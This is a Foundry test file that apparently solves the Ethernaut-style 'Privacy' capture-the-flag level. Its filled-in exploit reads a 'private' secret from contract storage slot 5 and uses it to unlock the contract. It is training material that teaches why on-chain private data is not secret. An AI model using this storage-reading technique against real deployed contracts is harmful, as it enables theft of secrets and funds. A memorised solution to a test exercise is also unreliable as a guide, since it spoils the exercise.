// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Privacy} from "../src/Privacy.sol";

contract PrivacyTest is Test {
    Privacy public target;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        bytes32[3] memory data = [
            keccak256("first secret"),
            keccak256("second secret"),
            keccak256("unlock secret")
        ];

        vm.startPrank(deployer);
        target = new Privacy(data);
        vm.stopPrank();
    }

    function testExploit() public {
        // Win condition:
        //   target.locked() == false
        //
        // `private` prevents Solidity access, but does not encrypt storage.
        // Storage layout:
        //   slot 0     -> locked
        //   slot 1     -> ID
        //   slot 2     -> flattening, denomination, and awkwardness (packed)
        //   slots 3-5  -> data[0], data[1], and data[2]
        //
        // Read a slot with:
        //   bytes32 value = vm.load(address(target), bytes32(uint256(slot)));
        //
        // unlock() expects the first 16 bytes of data[2].

        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        // data[2] lives in storage slot 5; unlock wants its first 16 bytes.
        bytes32 secret = vm.load(address(target), bytes32(uint256(5)));
        target.unlock(bytes16(secret));
        // ========== END EXPLOIT ==========

        vm.stopPrank();

        assertFalse(target.locked(), "privacy contract should be unlocked");
    }
}
